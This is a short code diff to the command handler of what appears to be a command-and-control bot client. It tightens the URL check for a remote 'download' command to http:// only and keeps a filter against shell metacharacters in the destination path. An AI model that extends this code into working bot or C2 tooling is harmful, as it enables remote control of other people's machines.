@@ -2399,9 +2399,16 @@ int protocol_process_commands(notnet_bot_t *bot) {
             if (url[0] == '\0') {
                 protocol_send_response(bot, CMD_DOWNLOAD,
                     "download: usage 'download <url> [path]'");
-            } else if (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0) {
+            } else if (strncmp(url, "http://", 7) != 0) {
+                /* SECURITY FIX (#111): only http:// is implemented.
+                 * http_download() parses http:// URLs; an https:// URL was
+                 * previously ACCEPTED by this gate, then silently fell into
+                 * the C2-fallback branch and downloaded the heartbeat path
+                 * with a 'download ok' response. The default build has no
+                 * TLS, so https is rejected explicitly — no silent
+                 * substitution of the wrong resource. */
                 protocol_send_response(bot, CMD_DOWNLOAD,
-                    "download: url must start with http:// or https://");
+                    "download: url must start with http:// (no TLS in this build)");
             } else if (strpbrk(dest, ";|&`$(){}[]<>!\n\r")) {
                 protocol_send_response(bot, CMD_DOWNLOAD,
                     "download: path rejected (dangerous character)");
